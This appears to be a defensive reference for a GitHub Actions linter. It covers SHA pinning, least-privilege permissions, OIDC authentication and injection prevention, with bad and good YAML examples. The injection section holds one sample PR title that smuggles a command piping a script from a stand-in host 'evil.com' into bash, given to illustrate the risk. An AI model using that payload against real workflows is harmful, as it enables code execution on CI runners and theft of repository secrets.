# Security Practices Reference

Detailed security rules for GitHub Actions workflows. Each rule includes threat context, bad/good examples, and edge cases.

## Table of Contents

- [S1: SHA Pinning](#s1-sha-pinning)
- [S2: Least-Privilege Permissions](#s2-least-privilege-permissions)
- [S3: OIDC Authentication](#s3-oidc-authentication)
- [S4: Injection Prevention](#s4-injection-prevention)

---

## S1: SHA Pinning

**Rule**: Every `uses:` directive referencing a third-party action must use the full 40-character commit SHA, followed by a comment with the human-readable version tag.

**Why**: Tags (`v4`, `v4.2.2`) and branches (`main`, `release`) are mutable Git refs. If an attacker compromises the action repository, they can move the tag to point at malicious code. Every workflow referencing `@v4` would then execute the attacker's payload. SHA pins are immutable — once a commit is created, its SHA cannot change.

### Bad Examples

```yaml
# BAD: Mutable tag - can be moved by attacker
- uses: actions/checkout@v4

# BAD: Branch reference - changes with every commit
- uses: actions/checkout@main

# BAD: Short SHA - ambiguous, could collide
- uses: actions/checkout@de0fac2

# BAD: SHA without version comment - unreadable for humans
- uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
```

### Good Examples

```yaml
# GOOD: Full SHA with version comment
- uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2

# GOOD: Third-party action with SHA pin
- uses: docker/build-push-action@4f58ea79222b3b9dc2c8bbdd6debcef730109a75 # v6.9.0
```

### Edge Cases

| Case | SHA Required? | Notes |
|------|--------------|-------|
| Local action (`uses: ./my-action`) | No | Code is in the same repo, already versioned |
| Reusable workflow (`uses: org/repo/.github/workflows/ci.yml@ref`) | Yes | Same supply chain risk as actions |
| Docker container (`uses: docker://alpine:3.19`) | No | Uses Docker image tag, not a Git ref |
| GitHub-owned actions (`actions/*`) | Yes | Even first-party actions should be pinned |
| Actions in the same org | Yes | Internal repos can still be compromised |

### How to Look Up SHAs

See [SHA_LOOKUP.md](SHA_LOOKUP.md) for detailed instructions using `gh api`, `git ls-remote`, and the GitHub UI.

---

## S2: Least-Privilege Permissions

**Rule**: Every workflow must include an explicit top-level `permissions:` block set to the minimum required access. Elevated permissions must be granted at the job level with a justification comment.

**Why**: In classic repositories (created before 2023-02), the default `GITHUB_TOKEN` permission is `read-write` for all scopes. Omitting the `permissions:` block means every job gets full write access to your repository contents, packages, deployments, and more. An attacker who achieves code execution in any step can exploit these permissions.

### Bad Examples

```yaml
# BAD: No permissions block - defaults to read-write-all in classic repos
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2

# BAD: Explicitly granting all permissions
permissions: write-all

# BAD: Granting write at top level when only one job needs it
permissions:
  contents: read
  packages: write  # Only the deploy job needs this
```

### Good Examples

```yaml
# GOOD: Restrictive top-level, elevated at job level
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
      - run: npm test

  deploy:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write  # Needed to push Docker image to GHCR
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2

# GOOD: Minimal permissions with empty object (no permissions at all)
permissions: {}
```

### Common Permission Patterns

| Use Case | Permissions Needed | Level |
|----------|-------------------|-------|
| Read-only CI (test, lint) | `contents: read` | Top-level |
| Push Docker image to GHCR | `packages: write` | Job-level |
| Comment on PR | `pull-requests: write` | Job-level |
| Deploy to GitHub Pages | `pages: write`, `id-token: write` | Job-level |
| Create a release | `contents: write` | Job-level |
| Update deployment status | `deployments: write` | Job-level |
| OIDC authentication | `id-token: write` | Job-level |
| Modify issue labels | `issues: write` | Job-level |

---

## S3: OIDC Authentication

**Rule**: Prefer OpenID Connect (OIDC) federation for cloud provider authentication. OIDC uses short-lived tokens issued by GitHub's OIDC provider, eliminating the need to store long-lived credentials as secrets.

**Why**: Static credentials (`AWS_ACCESS_KEY_ID`, `AZURE_CREDENTIALS`, `GCP_SA_KEY`) are long-lived, must be rotated manually, and can be leaked through logs or compromised steps. OIDC tokens are scoped to a single workflow run, expire in minutes, and cannot be reused.

### Bad Example (Static Credentials)

```yaml
# BAD: Static long-lived AWS credentials
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
      - name: Configure AWS
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: aws s3 sync ./dist s3://my-bucket
```

### Good Examples

**AWS (OIDC)**:
```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write  # Required for OIDC
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
      - uses: aws-actions/configure-aws-credentials@8df5847569e6427dd6c4fb1cf565c83acfa8afa7 # v6.0.0
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: us-east-1
      - run: aws s3 sync ./dist s3://my-bucket
```

**GCP (OIDC)**:
```yaml
      - uses: google-github-actions/auth@7c6bc770dae815cd3e89ee6cdf493a5fab2cc093 # v3.0.0
        with:
          workload_identity_provider: projects/123456/locations/global/workloadIdentityPools/github/providers/my-repo
          service_account: deploy@my-project.iam.gserviceaccount.com
```

**Azure (OIDC)**:
```yaml
      - uses: azure/login@eec3c95657c1536435858eda1f3ff5437fee8474 # v2.3.0
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
```

### When OIDC Is Not Available

OIDC may not be available in these cases:
- Self-hosted runners without internet access to GitHub's OIDC provider
- Cloud providers that do not support OIDC federation
- Organizational policies that have not yet configured OIDC trust
- Non-cloud targets (SSH to a server, FTP uploads, etc.)

When OIDC is not possible, static secrets are acceptable. The validator treats S3 violations as advisory.

---

## S4: Injection Prevention

**Rule**: Never interpolate untrusted event context directly in `run:` blocks using `${{ }}` expressions. Always map to an environment variable first, then reference the shell variable.

**Why**: When `${{ github.event.pull_request.title }}` is interpolated directly in a `run:` block, GitHub expands the expression before the shell executes. An attacker can craft a PR title like `"; curl http://evil.com/steal.sh | bash; echo "` which breaks out of the intended command and executes arbitrary code.

### Bad Examples

```yaml
# BAD: Direct interpolation of PR title in run block
- run: echo "Title: ${{ github.event.pull_request.title }}"

# BAD: Direct interpolation in multi-line run block
- run: |
    echo "Processing PR: ${{ github.event.pull_request.title }}"
    echo "Author: ${{ github.event.pull_request.head.ref }}"

# BAD: Interpolation in script arguments
- run: ./scripts/notify.sh "${{ github.event.comment.body }}"
```

### Good Examples

```yaml
# GOOD: Map to env, reference shell variable
- name: Log PR info
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    HEAD_REF: ${{ github.event.pull_request.head.ref }}
  run: |
    echo "Title: $PR_TITLE"
    echo "Branch: $HEAD_REF"

# GOOD: Use actions/github-script for complex operations
- uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
  with:
    script: |
      const title = context.payload.pull_request.title;
      console.log(`Title: ${title}`);
```

### Dangerous Contexts (Never Use Directly in `run:`)

These fields are attacker-controlled and must always be mapped to `env:` first:

| Context | Why Dangerous |
|---------|---------------|
| `github.event.issue.title` | Issue author controls content |
| `github.event.issue.body` | Issue author controls content |
| `github.event.pull_request.title` | PR author controls content |
| `github.event.pull_request.body` | PR author controls content |
| `github.event.pull_request.head.ref` | Branch name controlled by PR author |
| `github.event.comment.body` | Comment author controls content |
| `github.event.review.body` | Reviewer controls content |
| `github.event.head_commit.message` | Commit author controls content |
| `github.event.commits.*.message` | Commit author controls content |
| `github.event.commits.*.author.name` | Commit author controls content |
| `github.event.pages.*.page_name` | Wiki page author controls content |

### Safe Contexts (OK to Use Directly)

These fields are set by GitHub and cannot be manipulated by external actors:

- `github.repository`, `github.repository_owner`
- `github.sha`, `github.ref`, `github.ref_name`
- `github.workflow`, `github.run_id`, `github.run_number`
- `github.actor` (the authenticated user, not free-text)
- `github.event.pull_request.number` (numeric, not injectable)
- `github.event.pull_request.merged` (boolean)
